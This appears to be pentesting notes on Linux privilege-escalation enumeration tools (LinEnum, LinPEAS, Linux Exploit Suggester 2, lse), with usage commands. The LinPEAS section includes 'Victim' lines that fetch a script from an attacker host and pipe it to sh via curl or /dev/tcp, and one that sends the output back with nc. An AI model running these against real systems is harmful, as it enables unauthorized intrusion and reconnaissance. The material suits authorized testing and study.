# LinEnum – Linux Enumeration Script
This is an awesome Linux enumeration script. It’s run on the target host and searches for many of the common privilege escalation methods or misconfigurations.

Some of the enumeration information collected includes:

Kernel and distribution release details

- System information
- User information
- Privileged access
- Environmental information

https://github.com/rebootuser/LinEnum

## Usage
Download LinEnum

    wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

Mount http server in the folder where you downloaded it

    python3 -m http.server

Download LinEnum.sh on the target machine

    cd /tmp
    wget 192.168.56.107:8000/LinEnum.sh

Set the execution rights

    ls -la
    total 64
    drwxrwxrwt  4 root   root    4096 Sep  8 22:17 .
    drwxr-xr-x 22 root   root    4096 Sep 16  2015 ..
    drwxrwxrwt  2 root   root    4096 Sep  8 20:04 .ICE-unix
    drwxrwxrwt  2 root   root    4096 Sep  8 20:04 .X11-unix
    -rw-r--r--  1 daemon daemon 46631 Sep  8 20:12 LinEnum.sh

    chmod +x LinEnum.sh
    
    ls -la
    total 64
    drwxrwxrwt  4 root   root    4096 Sep  8 22:17 .
    drwxr-xr-x 22 root   root    4096 Sep 16  2015 ..
    drwxrwxrwt  2 root   root    4096 Sep  8 20:04 .ICE-unix
    drwxrwxrwt  2 root   root    4096 Sep  8 20:04 .X11-unix
    -rwxr-xr-x  1 daemon daemon 46631 Sep  8 20:12 LinEnum.sh

Start the script

    ./LinEnum.sh

# LinPEAS - Linux Privilege Escalation Awesome Script
LinPEAS is a script that searches for possible paths to escalate privileges on Linux/Unix*/MacOS hosts. The checks are explained on book.hacktricks.xyz.

Check the Local Linux Privilege Escalation checklist from book.hacktricks.xyz.

https://github.com/carlospolop/PEASS-ng/releases

## Quick Start
Find the latest versions of all the scripts and binaries in the releases page.

    # From github
    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

    # Local network
    sudo python -m SimpleHTTPServer 80 #Host
    curl 10.10.10.10/linpeas.sh | sh #Victim
    
    # Without curl
    sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
    cat < /dev/tcp/10.10.10.10/80 | sh #Victim
    
    # Excute from memory and send output back to the host
    nc -lvnp 9002 | tee linpeas.out #Host
    curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim

    # Output to file
    ./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
    less -r /dev/shm/linpeas.txt #Read with colors

    # Use a linpeas binary
    wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
    chmod +x linpeas_linux_amd64
    ./linpeas_linux_amd64

# Linux Exploit Suggester 2

https://github.com/jondonas/linux-exploit-suggester-2

    #############################
    Linux Exploit Suggester 2
    #############################
    
    Local Kernel: 3.13.0
    Searching 72 exploits...
    
    Possible Exploits
    [1] exploit_x
        CVE-2018-14665
        Source: http://www.exploit-db.com/exploits/45697
    [2] overlayfs
        CVE-2015-8660
        Source: http://www.exploit-db.com/exploits/39230
    [3] pp_key
        CVE-2016-0728
        Source: http://www.exploit-db.com/exploits/39277
    [4] timeoutpwn
        CVE-2014-0038
        Source: http://www.exploit-db.com/exploits/31346


# linux-smart-enumeration - lse

Linux enumeration tools for pentesting and CTFs

This project was inspired by https://github.com/rebootuser/LinEnum and uses many of its tests.

Unlike LinEnum, lse tries to gradualy expose the information depending on its importance from a privesc point of view.

https://github.com/diego-treitos/linux-smart-enumeration